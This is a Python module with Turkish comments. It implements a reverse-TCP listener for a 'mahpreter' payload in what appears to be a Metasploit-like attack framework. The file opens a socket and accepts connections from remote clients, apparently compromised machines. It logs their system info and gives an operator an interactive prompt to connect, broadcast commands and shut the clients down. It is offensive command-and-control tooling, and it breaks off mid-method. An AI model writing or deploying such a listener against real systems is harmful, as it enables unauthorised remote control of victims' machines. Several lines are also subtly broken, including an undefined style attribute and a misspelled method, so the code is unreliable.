from typing import Dict, Any 
# spesifik tipler.
from core.module import BaseModule 
# ana modül sınıfı.
from core.option import Option 
# option tanımlama için.
import socket 
# soket programlama için
import threading 
# çoklu işlem ve arkaplan işlemleri için. ana hedef sunucu hizmetinin arkaplanda seyretmesi.
import sys
# Python yorumlayıcısı ile ve yorumlayıcının çalıştığı çalışma zamanı ortamı (sistem) ile etkileşim kurmak için kullanılan standart bir modüldür.
import shlex
# shlex modülü, Python'daki kabuk sözdizimi ayrıştırması (shell syntax parsing) için tasarlanmış bir araçtır.
import base64
# iletişimi base64 encode etmek için
import struct
# Python'daki struct modülü, Python değerlerini (tamsayılar, kayan noktalar, dizeler vb.) standart C veri tipleri gibi temsil eden ikili (binary) verilere dönüştürmek ve tam tersi yönde çözümlemek (unpack) için kullanılır.
from prompt_toolkit import PromptSession
# prompt oluşturmak için.
from prompt_toolkit.completion import Completer, Completion
# otomatik tamamlama için.
from prompt_toolkit.history import InMemoryHistory
# komutları hafızaya alıp otomatik tamamlamada kullanmak için.
from prompt_toolkit.styles import Style
# prompt renklendirme için.
from prompt_toolkit.validation import Validator
# prompt doğrulama için.

class mahpreter_reverse_tcp_listener(BaseModule):
    """mahpreter reverse_tcp dinleyicisi.

    Args:
        BaseModule (_type_): _description_
    """
    Name = "listener"
    Description = "payloads/mahpreter/reverse_tp için listener."
    Author = "Mahmut P."
    Category = "payloads"
    def __init__(self):
        """init fonksiyon.
        """
        super().__init__()
        self.Options = {
            "ip":Option("IP", "0.0.0.0", True, "Sunucu ip adresi."),
            "port": Option("PORT",5000, True, "Sunucunun kullanacağı port.")
        }
        for option_name, option_obj in self.Options.items():
            setattr(self, option_name, option_obj.value)
    def run(self, options: Dict[str, Any]):
        """Modül çalışınca çalışacak fonksiyon.
        Dinleme yapacak

        Args:
            options (Dict[str, Any]): işlenecek Option'lar
        """
        HOST = options.get("IP")
        PORT = int(options.get("PORT"))
        # ne olur ne olmaz int ibaresi koydum.
        
        class ShellCompleter(Completer):
            """shell oturumu açılınca çalışacak otomatik tamamlama.

            Args:
                Completer (_type_): Otomatik tamamlama objesi.
            """
            def get_completions(self, document, complete_event):
                """otomatik tamamlayıcı.

                Args:
                    document (_type_): Mevcut belgeyi temsil eden obje.
                    complete_event (_type_): Otomatik tamamlama olayıyla ilgili bilgileri içeren obje.

                Yields:
                    _type_: Otomatik tamamlama objesi.
                """
                text_before_cursor = document.text_before_cursor
                prefix = text_before_cursor.lower().strip()
                
                if not prefix or prefix.startswith('b'):
                    yield Completion('back', start_position=-len(text_before_cursor))
        class ServerCompleter(Completer):
            """Sunucu için otomatik tamamlayıcı.

            Args:
                Completer (_type_): 
            """
            def __init__(self, app):
                self.app = app
            
            def get_completions(self, document, complete_event):
                """_summary_

                Args:
                    document (_type_): Mevcut belgeyi temsil eden obje.
                    complete_event (_type_): Otomatik tamamlama olayıyla ilgili bilgileri içeren obje.
                """
                text_before_cursor = document.text_before_cursor
                commands = ['help', 'clients', 'connect', 'disconnect', 'sendall', 'shutdown_all', 'exit']
                if not text_before_cursor:
                    # Boşsa: Bütün komutlar getirilir.
                    for cmd in commands:
                        yield Completion(cmd)
                    return
                if text_before_cursor[-1] == " ":
                    # Boşluktan sonraki imleç: Komut için argümanı tamamlıyor.
                    words = text_before_cursor[-1].split() # Sondaki boşluğu kaldır.
                    if words:
                        cmd = words[0].lower()
                        prefix = "" # Yeni argüman için boş önek.
                        if cmd in ['connect', 'disconnect']:
                            choices = self.app._get_client_choices()
                            for choice in choices:
                                # Önek boş olduğundan tüm getirileri ver.
                                yield Completion(choice, start_position=0)
                    return
                # Boşluktan sonra değil: bir kelime içinde tamamlama.
                words = text_before_cursor.split()
                prefix = words[-1] if words else text_before_cursor
                if len(words) == 0 or len(words) == 1:
                    # adları otomatik tamamlama.
                    for cmd in commands:
                        if cmd.lower().startswith(prefix.lower()):
                            yield Completion(cmd, start_position=-len(prefix))
                else:
                    # komut argümanı otomatik tamamlama.
                    cmd = words[0].lower()
                    if cmd in ['connect', 'disconnect']:
                        choices = self.app._get_client_choices()
                        for choice in choices:
                            if choice.startwith(prefix):
                                yield Completion(choice, start_position=-len(prefix))
        class MahpreterServer:
            def __init__(self):
                self.root_prompt_style = Style.from_dict({
                    'prompt': '#00aa00 bold',
                })
                self.shell_style = Style.from_dict({
                    'prompt': '#aa5500 bold',
                })
                self.prompt = "mahpreter> "
                self.intro = "Mahpreter listener hazı. Yardım için 'help' yazın enter'a basın. Tab tuşuna otomatik tamamlaa için basın."
                print(self.intro)

                self.active_clients = {}
                self.client_ids = []
                self.client_info = {}

                self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

                try:
                    self.server_socket.bind((HOST, PORT))
                    self.server_socket.listen(10)
                    print(f"[*] Sunucu dinlemede {HOST}:{PORT}")

                    self.accept_thread = threading.Thread(target=self.accept_connections)
                    self.accept_thread.daemon = True
                    self.accept_thread.start()
                
                except Exception as e:
                    print(f"[!] Sunucu başlatma hatası: {e}")
                    sys.exit(1)
                
                self.history = InMemoryHistory()
                self.completer = ServerCompleter(self)
                self.session = PromptSession(
                    self.prompt, 
                    completer=self.completer, 
                    history=self.history,
                    style=self.teacher_style
                )
            
            def recv_full_data(self, sock):
                """Bütün datayı çeken bir yapı

                Args:
                    sock (_type_): _description_
                """
                try:
                    length_bytes = sock.recv(4)
                    if len(length_bytes) != 4:
                        return None
                    length = struct.unpack('!I', length_bytes)[0]
                    data = b''
                    while len(data) < length:
                        packet = sock.recv(length - len(data))
                        if not packet:
                            return None
                        data += packet
                    return base64.b64decode(data).decode('utf-8')
                except:
                    return None
                
            def send_full_data(self, sock, data):
                """Uzunluk önekiyle tam veriyi gönder.

                Args:
                    sock (_type_): _description_
                    data (_type_): _description_
                """
            
                try:
                    data_bytes = data.encode('utf-8')
                    encoded = base64.b64encode(data_bytes)
                    length = len(encoded)
                    sock.send(struct.pack('!I', length) + encoded)
                except:
                    pass
            def accept_connections(self):
                """
                Yeni öğrencileri kabul etmek için arka plan döngüsü.
                
                :param self: Açıklama
                
                """
                while True:
                    try:
                        client_sock, addr = self.server_socket.accept()

                        # Handshake: Receive full encoded info
                        sys_info = self.recv_full_data(client_sock)
                        if sys_info is None:
                            client_sock.close()
                            continue

                        self.active_clients[addr] = client_sock
                        self.client_info[addr] = sys_info

                        if addr not in self.client_ids:
                            self.client_ids.append(addr)

                        print(f"\n[+] Yeni client: {addr[0]}:{addr[1]} ({sys_info})")

                    except OSError:
                        break  # Soket kapatıldı
                    